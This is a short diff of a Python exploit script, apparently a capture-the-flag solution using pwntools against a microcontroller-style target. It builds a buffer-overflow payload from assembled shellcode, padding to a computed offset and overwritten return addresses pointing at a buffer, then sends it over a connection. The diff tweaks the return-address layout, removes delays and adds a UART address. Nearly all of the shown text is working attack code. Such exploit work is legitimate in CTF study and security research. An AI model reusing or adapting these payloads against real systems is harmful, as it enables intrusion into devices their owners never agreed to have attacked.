@@ -70,8 +70,11 @@ code = asm("""
 	end:               
 	""")
 
+seed = 0x7ffde650
+
 off = 4 * 4 * 8 + (3 * 4)
 buf = 0x2000ff58
+uart1 = 0x4000d000
 needle = b'I am enlightened'
 
 r.recvuntil(b'possible')
@@ -79,14 +82,10 @@ payload = b'C' * len(needle)
 payload += code
 payload = payload.ljust(off, b'\x41')
 payload += p32(buf)
-payload += p32(buf+0x11) * 3 + p32(buf+0x11)
+payload += b'CCCC' + p32(buf+0x11)
 
-
-time.sleep(5)
 r.sendline(payload)
 
-
-time.sleep(5)
 r.recvuntil(b'possible')
 r.sendline(needle + code)
 
